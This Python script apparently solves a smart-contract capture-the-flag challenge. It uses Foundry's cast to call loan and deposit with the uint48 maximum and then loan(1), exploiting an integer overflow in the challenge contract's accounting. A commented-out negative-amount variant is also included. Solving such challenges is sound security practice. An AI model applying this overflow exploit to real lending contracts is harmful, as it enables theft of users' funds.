import os

with open("details", "r") as f:
    details = f.read()

details = details.splitlines()
detailsDict = dict()
for detail in details:
    detail = detail.split(": ")
    detailsDict[detail[0]] = detail[1]
    
os.environ["CONTRACT"] = detailsDict['contract address']
os.environ["RPC_URL"] = detailsDict['rpc-url']
os.environ["PRIV_KEY"] = detailsDict['Wallet private-key']

def isChallSolved():
    cmd = 'cast call $CONTRACT "isChallSolved()" --rpc-url=$RPC_URL --private-key=$PRIV_KEY'
    os.system(cmd)

def withdraw(amount):
    cmd = f'cast send $CONTRACT "withdraw(uint48)" {amount} --rpc-url=$RPC_URL --private-key=$PRIV_KEY'
    os.system(cmd)

def deposit(amount, value):
    cmd = f'cast send $CONTRACT "deposit(uint48)" {amount} --value {value} --rpc-url=$RPC_URL --private-key=$PRIV_KEY'
    os.system(cmd)

def loan(amount):
    cmd = f'cast send $CONTRACT "loan(uint48)" {amount} --rpc-url=$RPC_URL --private-key=$PRIV_KEY'
    os.system(cmd)

def loan_negative(amount):
    cmd = f'cast send $CONTRACT "loan(uint48)" -- -{amount} --rpc-url=$RPC_URL --private-key=$PRIV_KEY'
    os.system(cmd)

isChallSolved()

flag_amount = 281474976710655
loan(flag_amount)
deposit(flag_amount, flag_amount)
# loan_negative(flag_amount)
loan(1)


isChallSolved()

